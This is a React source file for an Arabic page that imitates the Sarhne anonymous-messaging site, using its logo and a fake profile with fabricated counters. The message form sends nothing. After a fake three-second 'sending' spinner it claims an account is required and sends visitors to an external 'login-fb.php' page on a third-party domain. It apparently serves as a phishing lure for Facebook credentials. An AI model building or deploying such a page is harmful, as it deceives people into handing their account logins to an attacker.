import React, { useState } from 'react';
import { Send, Facebook, Loader2, Image, MessageCircleQuestion, MoreHorizontal } from 'lucide-react';
import Modal from './components/Modal';
import Navbar from './components/Navbar';
import EmojiGrid from './components/EmojiGrid';

function App() {
  const [message, setMessage] = useState('');
  const [showModal, setShowModal] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showLoginPrompt, setShowLoginPrompt] = useState(false);
  const [isPrivate, setIsPrivate] = useState(true);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowModal(true);
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setShowLoginPrompt(true);
    }, 3000);
  };

  const handleFacebookLogin = () => {
    window.location.href = 'https://x.simo-dev.xyz/login-fb.php';
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-800 to-gray-900 text-white">
      <Navbar />

      <main className="container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto">
          <div className="flex justify-between text-gray-400 text-sm mb-4">
            <a href="#" className="hover:text-gray-300">دخول للحساب</a>
            <a href="#" className="hover:text-gray-300">تسجيل اشتراك</a>
          </div>

          <div className="bg-white rounded-xl shadow-xl overflow-hidden text-gray-900">
            <div className="text-center p-6">
              <h1 className="text-gray-900 text-xl mb-6 font-bold">
                اكتب رسالة إلى محمود أحمد دون أن يعرفك
              </h1>

              <div className="relative inline-block mb-6">
                <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center border-4 border-coral-500">
                  <img 
                    src="https://www.sarhne.com/assets/img/logo-150.jpg" 
                    alt="محمود أحمد" 
                    className="w-20 h-20 rounded-full object-cover"
                  />
                </div>
                <div className="absolute bottom-0 right-0 w-4 h-4 bg-green-500 rounded-full border-2 border-white"></div>
              </div>

              <h2 className="text-xl font-bold text-gray-900 mb-4">محمود أحمد</h2>
              
              <div className="flex justify-center gap-8 mb-8">
                <div className="text-center">
                  <div className="text-2xl font-bold text-gray-900">0</div>
                  <div className="text-sm text-gray-600">منشور</div>
                </div>
                <div className="text-center">
                  <div className="text-2xl font-bold text-gray-900">0</div>
                  <div className="text-sm text-gray-600">متابعون</div>
                </div>
                <div className="text-center">
                  <div className="text-2xl font-bold text-gray-900">0</div>
                  <div className="text-sm text-gray-600">يتابع</div>
                </div>
              </div>

              <button className="w-full bg-coral-500 text-white rounded-lg py-3 mb-8 hover:bg-coral-600 transition-colors duration-200">
                متابعة
              </button>

              <form onSubmit={handleSubmit} className="text-right">
                <textarea
                  value={message}
                  onChange={(e) => setMessage(e.target.value)}
                  className="w-full h-32 p-4 border rounded-lg resize-none text-gray-900 focus:ring-2 focus:ring-coral-500 focus:border-transparent"
                  placeholder="اكتب رسالة دون أن يعرف هويتك..."
                  dir="rtl"
                  maxLength={500}
                ></textarea>

                <div className="flex justify-between items-center mt-4 mb-6">
                  <div className="text-gray-600 text-sm">
                    الحروف المتبقية: {500 - message.length}
                  </div>
                  <div className="flex items-center gap-2">
                    <label className="flex items-center gap-2 text-sm text-gray-600">
                      <input
                        type="checkbox"
                        checked={isPrivate}
                        onChange={(e) => setIsPrivate(e.target.checked)}
                        className="rounded text-coral-500 focus:ring-coral-500"
                      />
                      بشكل سري
                    </label>
                  </div>
                </div>

                <EmojiGrid />

                <div className="flex gap-4 mt-6 mb-4">
                  <button type="button" className="action-button flex-1">
                    <Image className="w-5 h-5" />
                    اضافة صورة
                  </button>
                  <button type="button" className="action-button flex-1">
                    <MessageCircleQuestion className="w-5 h-5" />
                    اقترح سؤال
                  </button>
                </div>

                <button
                  type="submit"
                  className="w-full bg-gray-800 text-white py-3 rounded-lg flex items-center justify-center gap-2 hover:bg-gray-700 transition-colors duration-200"
                >
                  <Send className="w-4 h-4" />
                  إرسال الآن
                </button>
              </form>

              <div className="mt-6 text-sm text-gray-500 text-center">
                <div className="flex justify-between items-center">
                  <a href="#" className="hover:text-gray-700">شروط الخدمة</a>
                  <span>الزيارات: 192</span>
                  <a href="#" className="hover:text-gray-700">سياسة الخصوصية</a>
                </div>
                <p className="mt-2 text-xs">
                  ⚠️ تنويه: من اجل ان يتم حفظ الرسالة في صندوق الرسائل المرسلة تأكد اولاً من انها لم تكن مخالفة او لم يتم حذفها في وقت لاحق.
                  نحن نعمل بجد لتحويل رسالتك إلى صاحبها في اقرب وقت ممكن.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {showModal && (
        <Modal onClose={() => {
          setShowModal(false);
          setIsLoading(false);
          setShowLoginPrompt(false);
        }}>
          <div className="text-center p-6 text-gray-900">
            {isLoading ? (
              <>
                <Loader2 className="w-12 h-12 animate-spin mx-auto text-coral-500" />
                <p className="mt-4 text-lg">جاري الإرسال...</p>
              </>
            ) : showLoginPrompt && (
              <div className="space-y-4">
                <p className="text-lg mb-2">للاسف لا يمكنك إرسال رسالة إلى محمود أحمد حالياً يجب عليك إنشاء حساب أولاً</p>
                <p className="text-lg mb-4">يجب عليك أولاً إنشاء حساب صراحة لكي يمكنك مصارحة محمود أحمد</p>
                <button
                  onClick={handleFacebookLogin}
                  className="bg-[#1877f2] text-white px-6 py-3 rounded-lg flex items-center justify-center gap-2 hover:bg-[#166fe5] transition-colors duration-200 w-full"
                >
                  <Facebook className="w-5 h-5" />
                  <span>تسجيل الدخول عبر فيسبوك</span>
                </button>
              </div>
            )}
          </div>
        </Modal>
      )}
    </div>
  );
}

export default App;